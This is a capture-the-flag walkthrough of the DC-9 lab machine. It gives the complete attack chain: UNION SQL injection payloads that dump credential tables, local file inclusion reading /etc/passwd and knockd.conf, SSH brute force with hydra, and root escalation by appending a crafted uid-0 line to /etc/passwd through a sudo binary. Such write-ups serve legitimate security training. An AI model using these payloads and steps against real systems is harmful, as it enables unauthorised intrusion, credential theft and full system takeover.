# DC-9

## Initial access

Run `autorecon` to enumerate open ports and services:

```
sudo autorecon 192.168.149.209
```

Open ports discovered:

- **80** — HTTP (Apache httpd 2.4.38, Debian)
  - Additional webpages:
    - `http://192.168.149.209/display.php`
    - `http://192.168.149.209/manage.php`
    - `http://192.168.149.209/search.php`
    - `http://192.168.149.209/config.php`
    - `http://192.168.149.209/results.php`
    - `http://192.168.149.209/css/`
    - `http://192.168.149.209/includes/`

Browse to `http://192.168.149.209/display.php`, which contains a list of users. Extract the usernames from their email:

```
marym
julied
fredf
barneyr
tomc
jerrym
wilmaf
bettyr
chandlerb
joeyt
rachelg
rossg
monicag
phoebeb
scoots
janitor
janitor2
```

An attempt to log in at `http://192.168.149.209/manage.php` with these usernames and default credentials was unsuccessful.

Explore `http://192.168.149.209/search.php`. The page is vulnerable to UNION-based SQL injection. The payload `' OR 1=1 -- ` returns all records. Determine the number of columns by iterating through:

```
' UNION SELECT null --        (no result)
' UNION SELECT null, null --  (no result)
...
' UNION SELECT null, null, null, null, null, null --  (returns result)
```

Six columns are confirmed. Extract the database version, schema names, table names, and column names:

```
# Get SQL version
' UNION SELECT @@version, null, null, null, null, null --
ID: 10.3.17-MariaDB-0+deb10u1

# Get database names
' UNION SELECT schema_name, null, null, null, null, null FROM information_schema.schemata --
ID: information_schema
ID: Staff
ID: users

# Get tables within `Staff` database
' UNION SELECT table_name, null, null, null, null, null FROM information_schema.tables WHERE table_schema = 'Staff' --
ID: StaffDetails
ID: Users

# Get column names within `Users` table
' UNION SELECT column_name, null, null, null, null, null FROM information_schema.columns WHERE table_name = 'Users' --
ID: UserID
ID: Username
ID: Password
```

Extract usernames and password hashes from the `Users` table:

```
' UNION SELECT Username, Password, null, null, null, null FROM Users --
ID: admin
Name: 856f5de590ef37314e7c3bdf6f8a66dc
```

Crack the MD5 hash using [CrackStation](https://crackstation.net/): `admin:transorbital1`.

Log in as `admin` at `http://192.168.149.209/manage.php`. Redirected to `http://192.168.149.209/welcome.php`, which displays an error string of `File does not exist`, suggesting some form of file retrieval. The only new functionality is "Add Record."

Perform parameter fuzzing to discover the file retrieval parameter:

```
ffuf -u 'http://192.168.149.209/welcome.php?FUZZ=../../../../../../../etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -b 'PHPSESSID=iaulqmdauq5t346n6v3sdel3co' -fs 963
...
file                    [Status: 200, Size: 3365, Words: 71, Lines: 87, Duration: 12ms]
```

The parameter `file` was discovered. The flags `-b` specifies the session cookie and `-fs` filters out responses of a specific size.

Browse to `http://192.168.149.209/welcome.php?file=../../../../../../../etc/passwd` to confirm local file inclusion.

Further enumeration of the `search.php` SQL injection reveals the `StaffDetails` table columns and full staff details, as well as the `users` database with a `UserDetails` table containing additional usernames and password hashes:

```
# Get usernames and passwords from `users.UserDetails` table
' UNION SELECT username, password, null, null, null, null FROM users.UserDetails --
marym     / 3kfs86sfd
julied    / 468sfdfsd2
fredf     / 4sfd87sfd1
barneyr   / RocksOff
tomc      / TC&TheBoyz
jerrym    / B8m#48sd
wilmaf    / Pebbles
bettyr    / BamBam01
chandlerb / UrAG0D!
joeyt     / Passw0rd
rachelg   / yN72#dsd
rossg     / ILoveRachel
monicag   / 3248dsds7s
phoebeb   / smellycats
scoots    / YR3BVxxxw87
janitor   / Ilovepeepee
janitor2  / Hawaii-Five-0
```

Save the extracted usernames to `users.txt` and passwords to `passwords.txt`.

Run a follow-up `nmap` scan:

```
nmap -sS -p- -Pn 192.168.149.209
PORT   STATE    SERVICE
22/tcp filtered ssh
80/tcp open     http
```

Port 22 is filtered. Port knocking is required to open SSH. The knock sequence is found in `/etc/knockd.conf` via the LFI vulnerability:

```
http://192.168.149.209/welcome.php?file=../../../../../../../etc/knockd.conf
```

```
[openSSH]
sequence = 7469,8475,9842
seq_timeout = 25
command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
tcpflags = syn
```

The port knocking sequence is `7469, 8475, 9842`. Trigger it:

```
knock 192.168.149.209 7469:tcp 8475:tcp 9842:tcp
```

Verify SSH is now open:

```
nmap -sS -p- -Pn 192.168.149.209
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Brute force SSH login with `hydra`:

```
hydra -L users.txt -P passwords.txt ssh://192.168.149.209
...
[22][ssh] host: 192.168.149.209   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.149.209   login: joeyt       password: Passw0rd
[22][ssh] host: 192.168.149.209   login: janitor      password: Ilovepeepee
```

SSH as `chandlerb` and `joeyt` yields no `local.txt` and nothing of interest in their home directories.

SSH as `janitor`:

```
ssh janitor@192.168.149.209
janitor@lab-pg-debian10-dc-9-242-099:~$ whoami
janitor
```

No `local.txt` is present, but a hidden directory `.secrets-for-putin` is found:

```
janitor@lab-pg-debian10-dc-9-242-099:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
```

Three additional passwords are discovered: `P0Lic#10-4`, `B4-Tru3-001`, and `4uGU5T-NiGHts`. Add them to `passwords.txt`.

Enumerate users on the system:

```
janitor@lab-pg-debian10-dc-9-242-099:~$ ls -al /home
```

An additional user `fredf` is found. Add to `users.txt`.

Re-run `hydra`:

```
hydra -L users.txt -P passwords.txt ssh://192.168.149.209
...
[22][ssh] host: 192.168.149.209   login: fredf   password: B4-Tru3-001
```

SSH as `fredf`:

```
ssh fredf@192.168.149.209
fredf@lab-pg-debian10-dc-9-242-099:~$ whoami
fredf
```

Retrieve the `local.txt` flag:

```
fredf@lab-pg-debian10-dc-9-242-099:~$ cat local.txt
8398c95887b8ede60b5e1f7b2e8eb4f7
```

## Privilege escalation

Upload `linpeas.sh` to the target:

```
scp linpeas.sh fredf@192.168.149.209:/tmp
```

Run `linpeas.sh` to enumerate privilege escalation vectors:

```
fredf@lab-pg-debian10-dc-9-242-099:/tmp$ ./linpeas.sh
```

Important finding:

```
fredf may run the following commands on lab-pg-debian10-dc-9-242-099:
    (root) NOPASSWD: /opt/devstuff/dist/test/test
```

Run the binary:

```
fredf@lab-pg-debian10-dc-9-242-099:/tmp$ sudo /opt/devstuff/dist/test/test
sudo: unable to resolve host lab-pg-debian10-dc-9-242-099: Name or service not known
Usage: python test.py read append
```

Locate and read the underlying Python script:

```
fredf@lab-pg-debian10-dc-9-242-099:/tmp$ find / -name test.py 2>/dev/null
/opt/devstuff/test.py

fredf@lab-pg-debian10-dc-9-242-099:/tmp$ cat /opt/devstuff/test.py
#!/usr/bin/python

import sys

if len (sys.argv) != 3 :
    print ("Usage: python test.py read append")
    sys.exit (1)

else :
    f = open(sys.argv[1], "r")
    output = (f.read())

    f = open(sys.argv[2], "a")
    f.write(output)
    f.close()
```

The script reads the file specified by the first argument and appends its contents to the file specified by the second argument. Running as root via sudo, this is an arbitrary file append as root.

Generate a password hash and craft a malicious `/etc/passwd` entry:

```
openssl passwd -1 pwned
$1$W5oqM9mz$BCV2EHVWv0lkPntvH8PXz/

fredf@lab-pg-debian10-dc-9-242-099:/tmp$ nano root.txt
pwned:$1$W5oqM9mz$BCV2EHVWv0lkPntvH8PXz/:0:0:root:/root:/bin/bash
```

Append the entry to `/etc/passwd` and switch to the new root user:

```
fredf@lab-pg-debian10-dc-9-242-099:/tmp$ sudo /opt/devstuff/dist/test/test root.txt /etc/passwd

fredf@lab-pg-debian10-dc-9-242-099:/tmp$ su pwned
Password: pwned

root@lab-pg-debian10-dc-9-242-099:/tmp# whoami
root
```

Retrieve the `proof.txt` flag:

```
root@lab-pg-debian10-dc-9-242-099:/tmp# cd /root
root@lab-pg-debian10-dc-9-242-099:~# cat proof.txt
1820e3f67b31073058de37746c2589af
```
